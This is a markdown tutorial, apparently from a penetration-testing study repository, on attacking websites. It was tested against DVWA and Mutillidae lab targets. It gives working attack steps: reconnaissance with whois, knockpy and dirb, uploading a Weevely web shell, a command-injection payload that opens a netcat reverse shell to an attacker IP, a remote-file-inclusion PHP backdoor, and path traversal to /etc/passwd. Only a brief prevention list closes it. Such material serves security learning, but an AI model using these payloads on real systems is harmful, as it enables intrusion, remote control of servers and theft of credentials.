# How to hack a website
-   Since website is an application is an application installed on a "computer" all is applicable as before mentioned in the whole repo (server side attacks / client side attacks)
-   second possible way is the pen testing of the website
-   All was tested on the metasploitable linux running locally inside VMware. 
    -   On DVWA page (login: admin, password) was security set to low. 
    -   Mutillidae security set also to lowest level.

## Information gathering
-   IP addresses / domain name info, technology used / other websites on the same server / DNS records / unlisted files, sub-domains, directories
-   Tools:
    -   Whois Lookup - find info about the owner of the website
        -   https://whois.domaintools.com/
    -   Netcraft Site Report - technologies used on website
        -   https://sitereport.netcraft.com/
        -   to find the vulnerabilities in used technologies, many dbs exist (example: https://www.exploit-db.com/)
    -   Robtex DNS lookup - DNS information
        -   https://www.robtex.com/
        -   reverse lookup can help to get names of more websites installed on the same server. If it is not possible to hack to the desired website, try to hac to any other hosted website and then navigate to the desired website in shell ...
            -   other way to do reverse lookup is using bing.com. Put in search `ip: desired.ip.address.something`
    -   knockpy - search subdomains
        -   tool can be installed into Kali linux.
        -   usage: `knockpy desiredomain.com`
    -   dirb - discover sensitive files and directories based on wordlist
        -   can be installed on Kali linux
        -   brute force search on the website for all the mentioned
        -   for usage manual `man dirb`
        -   search for staff like `phpinfo` or `login` or `robots`

## Upload vulnerable file generated with Weevely
-   some websites allow to upload files without any check for the file
-   Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime.
-   Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network.
```bash
weevely generate 123456 shell.php # generates php agent with password 123456 to file shell.php
```
-   try to upload the generated PHP agent `shell.php` to the site. If it works try to connect to the website shell:
```bash
weevely http://website.url/uploads_path/shell.php 123456
```
-   this can be tested with metasplitable linux: ip_address/dvwa/vulnerabilities/upload/

## Code execution vulnerabilities
-   some input boxes on websites might allow the attacker to execute commands if the input is not checked. Same works for the SQL injection
-   try to run some one-line commands. Example if website allows ping: `8.8.8.8; pwd`. If it will print the ping and also current dir, then the inputbox is vulnerable.
-   this vulnerability can also be used to create backdoor:
    -   then just listen with metasploit as described in `08_client_side_attacks.MD` or use netcad:
        ```bash
        nc -vv -l -p 8080 ## -vv is to show all the output (verbose), -l listen, -p port
        ```
    -   put in the website vulnerable input: `8.8.8.8; nc -e /bin/sh 10.20.14.203 8080`. Change the IP address to the address of the attacker (if not in the same network, set the attacker's router port forwarding as in `12_hack_outside_local_network.MD`)
-   this can be tested with metasplitable linux: ip_address/dvwa/vulnerabilities/exec/

## Run file from different website 
-   same thing can be done with files uploaded from online
    -   just create simple php file, which will run desirable command and upload it to attacker server. Example for backdoor:
        ```php
        <?php
        passthru('nc -e /bin/sh 10.20.14.203 8080');
        ?>
        ```
    -   save file as txt, so it won't run on the attacker server
    -   listen to connections with netcat as above `nc -vv -l -p 8080`
    -   put it inside the url like: `site_url/?page=attacker_page/backdoor_file.txt`

## Find vulnerability in files stored locally on the website
-   play with URL. If the URL of any website is showing partly absolute paths or has links like `?page=include.php`, try to find any useful files. Some pages will show error like file not found and full path like `/var/www/html/.../include.php not found`
    -   if site shows full path like mentioned in the error message, try to find files in server like file with users and password in Linux (example `/etc/passwd`). 
        -   Example of usage: `website.url/?page=/../../../etc/passwd`, which might print the file with users

## Preventing vulnerabilities mentioned above
-   check the file type, don't allow user to upload any executable
-   Filter input (input validation), don't run dangerous functions
-   Disable allow_url_fopen & allow_url_include
    -   can be set in `/etc/php5/cgi/php.ini`
    -   check that the options are set to Off
-   Use static file inclusion (hardcoded file names)